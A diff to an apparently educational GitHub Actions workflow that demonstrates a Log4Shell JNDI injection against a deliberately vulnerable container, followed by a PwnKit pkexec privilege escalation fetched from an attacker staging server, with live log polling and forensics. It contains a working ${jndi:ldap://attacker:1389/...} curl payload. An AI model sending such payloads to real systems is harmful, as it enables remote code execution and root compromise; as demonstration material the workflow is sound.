@@ -394,7 +394,7 @@ jobs:
             sleep 2
           done
 
-      - name: "📖 Demo 4 — RCE as non-root, then attempt local privilege escalation"
+      - name: "📖 Demo 4 — Scenario"
         run: |
           S=$GITHUB_STEP_SUMMARY
 
@@ -408,29 +408,132 @@ jobs:
           Java-library RCE, the attacker's payload fetches a **second-stage OS-package exploit**
           from its own staging server — exactly what real intrusions do: land with an initial
           foothold, then pull down more powerful tools rather than carry everything at once.
-
-          ---
-
-          ### 💀 Attacker's machine — same exploit as Demo 1
-
-          ```bash
-          curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}"
-          ```
           HEADER
 
-          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D" > /dev/null || true
-          sleep 8
-
+      - name: "🔎 Live baseline — proving appuser is real, before any exploit runs"
+        run: |
+          S=$GITHUB_STEP_SUMMARY
           echo "" >> $S
-          echo "### 🎯 Inside the victim's container — RCE as \`appuser\`, then the escalation attempt" >> $S
+          echo "### 🔎 Baseline — live \`docker exec\` against the container this job is running right now" >> $S
+          echo "" >> $S
+          echo "Not a log excerpt — these commands run against the actual container, on the actual" >> $S
+          echo "GitHub Actions runner, seconds before the exploit fires:" >> $S
+          echo "" >> $S
+          echo '```console' >> $S
+          echo '$ docker exec vuln-app id' >> $S
+          docker exec vuln-app id >> $S || true
+          echo "" >> $S
+          echo '$ docker exec vuln-app ls -l /usr/bin/pkexec' >> $S
+          docker exec vuln-app ls -l /usr/bin/pkexec >> $S || true
+          echo "" >> $S
+          echo '$ docker exec vuln-app dpkg -s policykit-1 | grep Version' >> $S
+          docker exec vuln-app dpkg -s policykit-1 2>/dev/null | grep Version >> $S || true
+          echo '```' >> $S
+          echo "" >> $S
+          echo "Confirmed live: the app really runs as \`uid=1000(appuser)\`, and \`pkexec\` really" >> $S
+          echo "carries the SUID bit (\`rws\`) — it runs as root no matter which user invokes it." >> $S
+          echo "" >> $S
+          echo "---" >> $S
+          echo "" >> $S
+          echo "### 💀 Attacker's machine — same exploit as Demo 1" >> $S
+          echo "" >> $S
+          echo '```bash' >> $S
+          echo 'curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}"' >> $S
+          echo '```' >> $S
+
+      - name: "💀 Fire the exploit"
+        run: |
+          S=$GITHUB_STEP_SUMMARY
+          echo "" >> $S
+          echo "Sent live at \`$(date -u +%H:%M:%S) UTC\` from this runner:" >> $S
+          echo "" >> $S
+          echo '```console' >> $S
+          echo '$ curl -w "%{http_code}\n" "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}"' >> $S
+          HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D" || true)
+          echo "$HTTP_CODE" >> $S
+          echo '```' >> $S
+          echo "" >> $S
+          echo "The app answered normally — the exploit runs invisibly in the background. Watch it" >> $S
+          echo "happen live in the next step." >> $S
+
+      - name: "⏳ Watching it happen — live telemetry from both containers"
+        run: |
+          S=$GITHUB_STEP_SUMMARY
+          echo "" >> $S
+          echo "### ⏳ Watching the attack unfold in real time" >> $S
+          echo "" >> $S
+          echo "Polling \`docker logs\` on both running containers, once a second, printing each" >> $S
+          echo "milestone the instant it appears — this is the real order of events, not a canned" >> $S
+          echo "transcript:" >> $S
+          echo "" >> $S
+          echo '```console' >> $S
+
+          MARKERS=(
+            "callback|LDAP lookup received|📡 [callback] attacker's LDAP server received the JNDI callback"
+            "vuln-app|REMOTE CODE EXECUTION ACHIEVED|💥 [vuln-app] victim loaded the attacker's Java class — RCE confirmed"
+            "vuln-app|Not root. Fetching second-stage|🎣 [vuln-app] payload confirms it is not root — fetching PwnKit from the attacker's server"
+            "callback|Victim downloaded PwnKit shell script|📡 [callback] attacker's server saw the victim fetch pwnkit.sh"
+            "vuln-app|FOUND: pkexec SUID root|🔎 [vuln-app] payload found pkexec (SUID root) inside the container"
+            "vuln-app|HTTP 200 — data sent to attacker|📤 [vuln-app] stolen recon data POSTed back to the attacker"
+            "vuln-app|ESCALATION SUCCEEDED|👑 [vuln-app] pkexec exploited — payload is now running as root"
+          )
+          declare -A SEEN
+          DONE=0
+
+          for i in $(seq 1 20); do
+            for m in "${MARKERS[@]}"; do
+              IFS='|' read -r CONTAINER PATTERN LABEL <<< "$m"
+              if [ -z "${SEEN[$m]:-}" ]; then
+                if docker logs "$CONTAINER" 2>&1 | grep -qF "$PATTERN"; then
+                  SEEN[$m]=1
+                  printf '[+%02ds] %s\n' "$i" "$LABEL" >> $S
+                fi
+              fi
+            done
+            BANNERS=$(docker logs vuln-app 2>&1 | grep -c "══════" || true)
+            if [ "${BANNERS:-0}" -ge 3 ]; then
+              DONE=1
+              printf '[+%02ds] 🏁 payload finished executing inside the victim container\n' "$i" >> $S
+              break
+            fi
+            sleep 1
+          done
+          [ "$DONE" -eq 1 ] || echo "⏱️  stopped polling after 20s — showing whatever landed by then" >> $S
+          echo '```' >> $S
+
+      - name: "🎯 Forensics — proof this ran on a real machine"
+        run: |
+          S=$GITHUB_STEP_SUMMARY
+          echo "" >> $S
+          echo "### 🎯 Forensics — what the exploit left behind inside \`vuln-app\`" >> $S
+          echo "" >> $S
+          echo "The attacker's second-stage script downloaded, compiled, and ran a real C exploit" >> $S
+          echo "*inside this container* moments ago. It's still there — this isn't a description," >> $S
+          echo "it's \`docker exec\` reading the container's actual \`/tmp\` right now:" >> $S
+          echo "" >> $S
+          echo '```console' >> $S
+          echo '$ docker exec vuln-app ls -la /tmp' >> $S
+          docker exec vuln-app ls -la /tmp >> $S || true
+          echo "" >> $S
+          echo '$ docker exec vuln-app stat /tmp/pwnkit' >> $S
+          docker exec vuln-app stat /tmp/pwnkit >> $S 2>&1 || true
+          echo "" >> $S
+          echo '$ docker exec vuln-app id   # (the long-lived container process — still appuser)' >> $S
+          docker exec vuln-app id >> $S || true
+          echo '```' >> $S
+          echo "" >> $S
+          echo "### 📜 Full annotated log recap" >> $S
           echo "" >> $S
           echo '```' >> $S
-          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|User:|Hostname:|OS:|shadow|Privilege escalation|Not root|Fetching|PwnKit|pkexec|gcc|FOUND|FAIL|Escalating|ESCALATION SUCCEEDED|Current user|Regardless|✓|──" >> $S
+          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|User:|Hostname:|OS:|shadow|Privilege escalation|Not root|Fetching|PwnKit|pkexec|gcc|FOUND|FAIL|Escalating|ESCALATION SUCCEEDED|Current user|Regardless|✓|──" >> $S || true
           echo '```' >> $S
-          echo "" >> $S
 
+      - name: "💡 Verdict"
+        run: |
+          S=$GITHUB_STEP_SUMMARY
           if docker logs vuln-app 2>&1 | grep -q "ESCALATION SUCCEEDED"; then
             cat >> $S << 'ESCALATED'
+
           ### 💡 Key takeaway
 
           > **Full compromise from a single HTTP request, despite running as non-root.** The
@@ -440,6 +543,7 @@ jobs:
           ESCALATED
           else
             cat >> $S << 'BLOCKED'
+
           ### 💡 Key takeaway
 
           > **The Java-library RCE still worked exactly like Demo 1** — non-root didn't stop that
